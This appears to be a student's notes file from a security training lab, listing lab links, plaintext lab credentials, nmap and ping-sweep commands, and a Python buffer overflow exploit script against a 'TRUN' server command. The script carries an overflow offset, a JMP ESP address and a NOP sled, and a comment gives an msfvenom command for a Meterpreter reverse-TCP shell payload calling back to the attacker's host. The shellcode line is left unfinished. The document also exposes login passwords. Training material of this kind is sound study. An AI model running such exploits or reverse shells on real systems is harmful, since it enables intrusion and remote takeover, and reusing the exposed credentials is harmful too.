# Useful Links

## GTFO BINS
https://gtfobins.github.io/

## Security CTFD Server
https://sec.cybbh.io/public/security/latest/index.html

	CTFD Server: http://10.50.20.250:8000	
	User: NIRI-505-M  
	Pass: gVN5chrkxW0bym1 	

## LinOps:
	ssh -X student@10.50.22.235
	password1

 ## Winops:

	xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.29.77

 # Host Discovery 

     nmap -v -sT -Pn -T4 -sV 192.168.28.111,120
## HTTP Enumeration Script:

    nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80

## Ping Sweep: 

     for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done

     
### secureServerBuffo.py script
	#!/usr/bin/python2.7
	
	import socket
	
	'''
	625011AF
	625011BB
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
 	lhost = linux opstation, or whatever host is used to as the attack platform for operation. 
  
    Set multi/handler on msfconsole, & and use script with msfvenom payload 
	'''
	
	
	buf = "TRUN /.:/" #Exploit
	buf += "A" * 2003 #Buffer Offset
	buf += "\xa0\x12\x50\x62"  #JMP ESP
	buf += "\x90" * 15 #NOP SLED
	buf += #SHELLCODE HERE
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket
	
	s.connect(("0.0.0.0",412XX))    #IP and port to connect to through tunnel
 	print s.recv(1024)   #print response
	s.send(buf)       #sends the variable buf
	print s.recv(1024)   #print response
	s.close()         #close the connection

